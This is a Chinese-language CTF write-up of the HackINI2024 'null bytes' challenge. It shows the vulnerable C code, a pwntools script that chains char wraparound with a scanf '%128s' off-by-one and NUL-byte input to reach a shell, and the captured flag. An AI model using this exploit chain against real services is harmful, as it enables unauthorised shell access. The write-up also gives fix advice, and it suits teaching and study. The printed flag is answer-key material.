# HackINI2024 null bytes

## 题目简述

服务先要求把全局 `char impossible` 从 1 变为 0，随后让用户输入一段“假 flag”，并通过 `strncmp()` 与真实 flag 比较。程序同时存在 8 位整数回绕、`scanf()` 长度边界错误和空字节输入问题，组合后可以在不知道 flag 的情况下取得 shell。

## 解题过程

菜单中的加法分支执行：

```c
char impossible = 1;
impossible++;
```

在题目编译环境中 `char` 为 8 位，连续选择 255 次 `+1` 后，值从 1 经 255 回绕到 0。此时选择检查功能即可进入下一阶段。

比较代码中有两个相邻的 128 字节栈数组：

```c
char fake_flag[128] = {0};
char flag[128] = {0};

size_t length = fread(flag, 1, 120, flag_file);
scanf("%128s", fake_flag);

if (strncmp(fake_flag, flag, length) == 0) {
    system("/bin/sh");
}
```

`%128s` 最多会存入 128 个输入字节，但还必须额外写入字符串结尾的 `\0`。目标数组恰好只有 128 字节，所以终止符发生一字节越界，并在附件二进制的栈布局中把相邻 `flag` 的首字节清零。再让 `fake_flag` 自身也以空字节开头，`strncmp()` 看到两个字符串的第一个字符都是 `\0`，立即判断相等。

完整交互可写为：

```python
from pwn import *

io = process("./vuln")

for _ in range(255):
    io.sendlineafter(b"Choose :", b"1")

io.sendlineafter(b"Choose :", b"2")
io.sendlineafter(
    b"Come on you should know the flag now :( :",
    b"\x00" * 128,
)
io.interactive()
```

取得 shell 后读取：

```text
shellmates{S0m3t!m3s_Nu11_Byt3s_Ar3_V3ry_Us3Full}
```

## 方法总结

本题不是单一空字节技巧，而是三步利用链：先通过 8 位回绕满足门槛，再利用 `%128s` 为终止符少留一个字节造成越界，最后让比较双方都以 NUL 开头。宽度为 128 并不意味着适合 128 字节数组；若目标是 C 字符串，格式宽度最多应为 127，并且服务还应拒绝二进制 NUL 输入、避免依赖有符号性未明确的 `char` 回绕。
